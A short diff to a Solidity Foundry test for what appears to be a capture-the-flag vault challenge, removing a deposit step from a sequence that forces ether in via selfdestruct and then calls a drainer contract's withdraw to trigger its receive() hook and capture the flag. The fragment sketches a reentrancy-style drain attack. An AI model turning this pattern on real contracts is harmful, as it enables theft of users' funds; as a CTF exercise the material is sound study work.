@@ -65,9 +65,6 @@ contract VaultTest is Test {
         //Forces Eth to be sent to contract by selfdestructing the contract
         selfDestructor.implode{value: 1 ether}();
 
-        //Deposit 2 eth using the drainer contract
-        drainerContract.callDeposit{value: 2 ether}();
-
         //Call withdraw from drainer contract to trigger code in recieve() and grab the flag
         drainerContract.callWithdraw();
         vault.captureTheFlag(msg.sender);
